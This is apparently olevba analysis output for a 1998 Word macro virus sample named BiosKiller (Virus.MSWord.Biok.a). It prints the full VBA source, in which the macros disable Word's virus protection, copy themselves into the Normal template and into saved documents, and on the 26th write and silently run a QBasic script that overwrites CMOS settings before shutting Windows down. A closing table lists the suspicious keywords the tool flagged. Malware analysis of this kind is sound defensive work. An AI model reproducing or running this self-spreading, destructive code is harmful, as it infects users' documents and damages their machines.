olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Biok.a-a6b2fc2b0d54d3872af04793f7b3401e592a8afc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO BiosKiller.cls 
in file: Virus.MSWord.Biok.a-a6b2fc2b0d54d3872af04793f7b3401e592a8afc - OLE stream: 'Macros/VBA/BiosKiller'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAuEx
Call PayBiosKiller
ErrorAuEx:
End Sub
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorDOp
iMacroNormalCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroNormalCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "BiosKiller" Then
        BiosKillerInstalled = -1
    End If
Next i
If Not BiosKillerInstalled Then
    ActiveDocument.VBProject.VBComponents("BiosKiller").Export "C:\BK.sys"
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\BK.sys"
    ActiveDocument.VBProject.VBComponents("BiosKiller").Export "C:\APVBK.sys"
    NormalTemplate.VBProject.VBComponents.Import "C:\APVBK.sys"
    NormalTemplate.VBProject.VBComponents("BiosKiller").CodeModule.DeleteLines 1, 4
End If
ErrorDOp:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSAs
Dialogs(wdDialogFileSaveAs).Show
If ActiveDocument.SaveFormat = wdFormatTemplate Or ActiveDocument.SaveFormat = wdFormatDocument Then
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
End If
iMacroDocumentCount = ActiveDocument.VBProject.VBComponents.Count
For i = 1 To iMacroDocumentCount
If ActiveDocument.VBProject.VBComponents(i).Name = "BiosKiller" Then
    BiosKillerDocInstalled = -1
End If
Next i
If Not BiosKillerDocInstalled Then
NormalTemplate.VBProject.VBComponents("BiosKiller").Export "C:\BK.sys"
ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\BK.sys"
NormalTemplate.VBProject.VBComponents("BiosKiller").Export "C:\APVBK.sys"
ActiveDocument.VBProject.VBComponents.Import "C:\APVBK.sys"
ActiveDocument.VBProject.VBComponents("BiosKiller").CodeModule.DeleteLines 1, 4
ActiveDocument.Save
End If
ErrorFSAs:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFiTe
MsgBox "Vous feriez mieux de vous acheter un AV...", vbCritical, "Virus BiosKiller"
ErrorFiTe:
End Sub
Sub HelpAbout()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorHeAb
CommandBars("Help").Controls(5).Caption = "A propos du Virus BiosKiller"
APVBK.Show
ErrorHeAb:
End Sub
Sub PayBiosKiller()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorPBK
Dim MyDate, MyTime
MyDate = Date
MyTime = Time
Tm$ = Mid(MyTime, 4, 5)
Ts$ = Mid(MyTime, 7, 8)
D1$ = Mid(MyDate, 1, 2)
If (Tm$ = "26") Or (Ts$ = "26") Then
    MsgBox "Vous connaissez le virus CIH ?" & Chr$(13) & "Je fais la même chose que lui...", vbCritical, "Virus BiosKiller"
End If
If D1$ = "26" Then
    MsgBox "Votre Bios va subir des changements..." & Chr$(13) & "HAHAHAHAHA", vbCritical, "Virus BiosKiller"
Open "C:\CMOS.bas" For Output As #1
    Print #1, "CLS"
    Print #1, "Screen 9"
    Print #1, "Color 4"
    Print #1, "DIM Byte AS STRING * 1"
    Print #1, "For CMOS = 1 To LOF(1)"
    Print #1, "OUT &H70, CMOS - 1"
    Print #1, "GET #1, , Byte"
    Print #1, "OUT &H71, ASC(Byte)"
    Print #1, "Next"
    Print #1, "Print ""Votre Bios a été flashé, HAHAHAHAHA!!!"""
    Print #1, "System"
Close #1
Shell "qbasic /run C:\CMOS.bas", vbHide
MsgBox "Votre bios a été flashé..." & Chr$(13) & "Je vais redémarrer votre ordinateur...", vbInformation, "Virus BiosKiller"
Tasks.ExitWindows
End If
ErrorPBK:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorToMa
MsgBox "Je suis un virus comme CIH...", vbCritical, "Virus BiosKiller"
ErrorToMa:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBCo
ErrorVVBCo:
End Sub
-------------------------------------------------------------------------------
VBA MACRO APVBK.frm 
in file: Virus.MSWord.Biok.a-a6b2fc2b0d54d3872af04793f7b3401e592a8afc - OLE stream: 'Macros/VBA/APVBK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Unload APVBK
End Sub
Private Sub Userform_Initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Biok.a-a6b2fc2b0d54d3872af04793f7b3401e592a8afc' - OLE stream: 'Macros/APVBK/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ce virus a �t� cr�e par ZeMacroKiller98 du groupe [SOS]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Biok.a-a6b2fc2b0d54d3872af04793f7b3401e592a8afc' - OLE stream: 'Macros/APVBK/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Biok.a-a6b2fc2b0d54d3872af04793f7b3401e592a8afc' - OLE stream: 'Macros/APVBK/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�This virus was created by ZeMacroKiller98 of [SOS] group�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Biok.a-a6b2fc2b0d54d3872af04793f7b3401e592a8afc' - OLE stream: 'Macros/APVBK/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Biok.a-a6b2fc2b0d54d3872af04793f7b3401e592a8afc' - OLE stream: 'Macros/APVBK/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Copyright (c) 1998I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Biok.a-a6b2fc2b0d54d3872af04793f7b3401e592a8afc' - OLE stream: 'Macros/APVBK/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Biok.a-a6b2fc2b0d54d3872af04793f7b3401e592a8afc' - OLE stream: 'Macros/APVBK/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Biok.a-a6b2fc2b0d54d3872af04793f7b3401e592a8afc' - OLE stream: 'Macros/APVBK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Biok.a-a6b2fc2b0d54d3872af04793f7b3401e592a8afc' - OLE stream: 'Macros/APVBK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Biok.a-a6b2fc2b0d54d3872af04793f7b3401e592a8afc' - OLE stream: 'Macros/APVBK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Biok.a-a6b2fc2b0d54d3872af04793f7b3401e592a8afc' - OLE stream: 'Macros/APVBK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

